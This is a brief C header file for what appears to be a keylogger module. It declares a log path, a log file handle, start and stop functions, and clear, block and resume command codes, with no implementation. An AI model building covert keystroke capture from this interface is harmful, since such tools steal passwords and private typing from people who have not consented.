#ifndef __KEYLOGGER_H
#define __KEYLOGGER_H

#define KEYLOGGER_CMD_CLEAR 0x1
#define KEYLOGGER_CMD_BLOCK 0x2
#define KEYLOGGER_CMD_RESUME 0x0

extern char* keylogger_path;
extern int keylogger_cmd;
extern FILE *flog;
extern void keylogger_Start(void);
extern void keylogger_Stop(void);

#endif
